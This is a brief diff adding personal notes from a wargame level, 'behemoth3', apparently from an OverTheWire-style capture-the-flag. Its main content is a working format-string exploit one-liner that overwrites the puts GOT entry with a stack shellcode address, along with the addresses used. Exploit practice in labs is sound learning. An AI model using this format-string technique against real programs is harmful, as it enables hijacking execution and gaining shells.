@@ -1,0 +1,12 @@
+behemoth3@gibson:/tmp/tmp.8ORM86YMnv$ (python3 -c "import sys, struct;
+sys.stdout.buffer.write(b'JUNK'+struct.pack('<I', 0x804b1ff)+b'JUNK'
++struct.pack('<I', 0x804b201)+b'JUNK'+struct.pack('<I',
+0x804b202)+b'JUNK'+struct.pack('<I', 0x804b203)+
+b'%60200x%hn'+b'%142x%n'+b'%41x%n'+b'%256x%n')";cat) | /behemoth/behemoth3
+
+puts address: 0x804b200
+
+address is 0xffffd6eb (SHELLCODE)
+
+
+it a little complicated, need to try and check many times, byte by byte
